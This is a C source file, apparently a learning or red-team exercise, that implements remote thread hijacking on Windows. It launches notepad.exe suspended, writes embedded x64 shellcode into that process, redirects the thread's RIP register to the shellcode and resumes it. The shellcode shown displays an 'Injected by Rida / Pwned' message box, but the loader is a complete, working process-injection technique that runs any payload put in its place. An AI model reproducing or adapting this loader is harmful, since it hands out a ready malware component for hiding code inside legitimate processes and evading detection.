#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/*
Suspend then patch the rip register from a thread to point to the shellcode !
 - use GetThreadConext -> Populate CONTEXT struct (https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
 - then setThreadContext -> apply a said CONTEXT to a thread
*/
BOOL create_suspended_proc(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread){
    CHAR				    lpPath          [MAX_PATH * 2];
	CHAR				    WnDr            [MAX_PATH];

	STARTUPINFO			    Si              = { 0 };
	PROCESS_INFORMATION		Pi              = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable
    //Pour eviter le cas ou le systeme est pas sur C:\ par exemple
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... \n", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		(LPSTARTUPINFOA)&Si,	// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId    = Pi.dwProcessId;
	*hProcess       = Pi.hProcess;
	*hThread        = Pi.hThread;
	
	// Doing a check to verify we got everything we need
	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
    DWORD dwOldProtection = 0;
    PVOID   pAddress        = NULL;
	size_t   bytesWritten    = 0;
	CONTEXT ThreadCtx       = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Shellcode space allocated at 0x%p w/ RW\n", pAddress);

	// Copying the payload to the allocated memory
	WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &bytesWritten);
    printf("[+] Shellcode written in code cave\n");

    // Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Thread context grabbed\n");

    // On change le registre RIP avec l'addr de notre shellcode
    printf("[+] Setting context.RIP from 0x%p to 0x%p\n", ThreadCtx.Rip, pAddress);
	ThreadCtx.Rip = (DWORD64)pAddress;

    // Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Hijacked context applied to thread !\n");
    // Changing the memory protection
	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] protection flag setted to RX \n");

	return TRUE;
}

int main(int argc, char** argv){
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    size_t shellcode_64_sz = sizeof(shellcode_64);

    LPCSTR lpProcessName = "notepad.exe";
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    create_suspended_proc(lpProcessName, &dwProcessId, &hProcess, &hThread);

    printf("[+] Remote Process (%s) created !\n", lpProcessName);

    if(!hijack_remote_dummy(hProcess, hThread, (PBYTE)&shellcode_64, shellcode_64_sz)) {
        printf("[-] hijack_dummy Failed : %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Local Thread hijacked !\n");

    ResumeThread(hThread);
    printf("[+] hijacked thread resumed !\n");
    printf("[+] Waiting fo thread !\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Done !\n");
        
    return 0;
}